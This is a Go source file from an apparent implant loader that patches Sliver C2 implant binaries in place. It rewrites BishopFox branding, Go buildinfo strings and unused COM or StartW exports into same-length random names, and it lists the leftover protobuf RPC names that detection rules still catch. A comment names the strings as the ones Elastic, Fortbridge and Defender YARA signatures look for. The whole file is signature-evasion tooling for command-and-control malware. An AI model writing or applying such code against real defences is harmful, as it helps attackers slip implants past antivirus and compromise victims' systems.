package loader

import (
	"bytes"
	"unicode"
)

// Family strings Elastic/Fortbridge/DefenderYara use on Sliver implants.
// Protobuf RPC names cannot be rewritten against a stock sliver-server.
var brandingNeedles = []string{
	"github.com/bishopfox/sliver/protobuf/sliverpbb",
	"github.com/bishopfox/sliver/protobuf/sliverpb",
	"github.com/bishopfox/sliver/protobuf",
	"github.com/bishopfox/sliver",
	"github.com/BishopFox/sliver",
	"BishopFox",
	"bishopfox",
	"Go buildinf:",
}

var protoNeedles = []string{
	"sliverpb",
	").RequestResend",
	").GetPrivInfo",
	").GetReconnectIntervalSeconds",
	").GetPivotID",
	"name=PrivInfo",
	"name=ReconnectIntervalSeconds",
	"name=PivotID",
	"InvokeSpawnDllReq",
	"NetstatReq",
	"HTTPSessionInit",
	"ScreenshotReq",
	"RegistryReadReq",
	"GetJitter",
	"VoidFunc",
	"AddTunnel",
	"GetIsIOC",
	"GetKill",
	"DllUnregisterServer",
	"DllRegisterServer",
	"DllInstall",
	"StartW",
}

var unusedExports = []string{
	"DllUnregisterServer",
	"DllRegisterServer",
	"DllInstall",
}

const cleanNote = "Branding, Go buildinfo, and unused COM exports were rewritten in place (same length). Stock-server protobuf names (sliverpb, GetJitter, …) are reported, not rewritten here. Bundled patched server already morphs those at generate. This is not a Defender bypass."

// CleanReport is the honest result of a same-length branding pass.
type CleanReport struct {
	Replaced  []string `json:"replaced"`
	Remaining []string `json:"remaining"`
	Export    string   `json:"export,omitempty"`
	Note      string   `json:"note"`
}

// CleanOpts controls the in-place branding pass.
type CleanOpts struct {
	Seed          []byte
	RenameStartW  bool
	RenameExports bool
}

// CleanImplant rewrites branding / buildinfo / unused exports in a copy of
// buf. Length is unchanged. Protobuf RPC names are reported, not rewritten.
func CleanImplant(buf []byte, opts CleanOpts) (out []byte, rep CleanReport) {
	out = append([]byte(nil), buf...)
	rep.Note = cleanNote
	seed := opts.Seed
	if len(seed) == 0 {
		seed = []byte{0x5A, 0xA5, 0x3C, 0xC3}
	}
	seen := map[string]bool{}
	add := func(s string) {
		if s != "" && !seen[s] {
			seen[s] = true
			rep.Replaced = append(rep.Replaced, s)
		}
	}

	for _, n := range brandingNeedles {
		if patchFullword(out, []byte(n), morphKeepSep([]byte(n), seed)) > 0 {
			add(n)
		}
		if patchUTF16(out, []byte(n), morphKeepSep([]byte(n), seed)) > 0 {
			add(n + " (utf16)")
		}
	}

	if opts.RenameExports {
		for _, n := range unusedExports {
			neu := morphIdent([]byte(n), seed)
			if patchFullword(out, []byte(n), neu) > 0 {
				add(n)
			}
		}
	}
	if opts.RenameStartW {
		neu := morphIdent([]byte(DefaultRDIExport), seed)
		if patchFullword(out, []byte(DefaultRDIExport), neu) > 0 {
			rep.Export = string(neu)
			add(DefaultRDIExport)
		}
	}

	rep.Remaining = scanNeedles(out, protoNeedles)
	return out, rep
}

func scanNeedles(buf []byte, needles []string) []string {
	var hit []string
	for _, n := range needles {
		if bytes.Contains(buf, []byte(n)) {
			hit = append(hit, n)
		}
	}
	return hit
}

func isWord(c byte) bool {
	return unicode.IsLetter(rune(c)) || unicode.IsDigit(rune(c))
}

func patchFullword(buf, old, neu []byte) int {
	if len(old) == 0 || len(old) != len(neu) {
		return 0
	}
	n := 0
	for i := 0; i+len(old) <= len(buf); {
		if !bytes.Equal(buf[i:i+len(old)], old) {
			i++
			continue
		}
		if i > 0 && isWord(buf[i-1]) {
			i++
			continue
		}
		if i+len(old) < len(buf) && isWord(buf[i+len(old)]) {
			i++
			continue
		}
		copy(buf[i:i+len(old)], neu)
		n++
		i += len(old)
	}
	return n
}

func patchUTF16(buf, oldASCII, neuASCII []byte) int {
	if len(oldASCII) == 0 || len(oldASCII) != len(neuASCII) {
		return 0
	}
	old := asciiToUTF16(oldASCII)
	neu := asciiToUTF16(neuASCII)
	n := 0
	for i := 0; i+len(old) <= len(buf); {
		if !bytes.Equal(buf[i:i+len(old)], old) {
			i++
			continue
		}
		if i >= 2 && buf[i-1] == 0 && isWord(buf[i-2]) {
			i++
			continue
		}
		end := i + len(old)
		if end+1 < len(buf) && buf[end+1] == 0 && isWord(buf[end]) {
			i++
			continue
		}
		copy(buf[i:i+len(old)], neu)
		n++
		i += len(old)
	}
	return n
}

func asciiToUTF16(s []byte) []byte {
	out := make([]byte, len(s)*2)
	for i, c := range s {
		out[i*2] = c
	}
	return out
}

func morphKeepSep(old, seed []byte) []byte {
	out := make([]byte, len(old))
	j := 0
	for i, c := range old {
		if isWord(c) {
			b := seed[j%len(seed)] ^ byte(j) ^ c
			letter := 'a' + (b % 26)
			if c >= 'A' && c <= 'Z' {
				letter -= 32
			}
			out[i] = letter
			j++
		} else {
			out[i] = c
		}
	}
	return out
}

func morphIdent(old, seed []byte) []byte {
	out := morphKeepSep(old, seed)
	if len(out) == 0 {
		return out
	}
	if out[0] >= '0' && out[0] <= '9' {
		out[0] = 'A'
	}
	return out
}
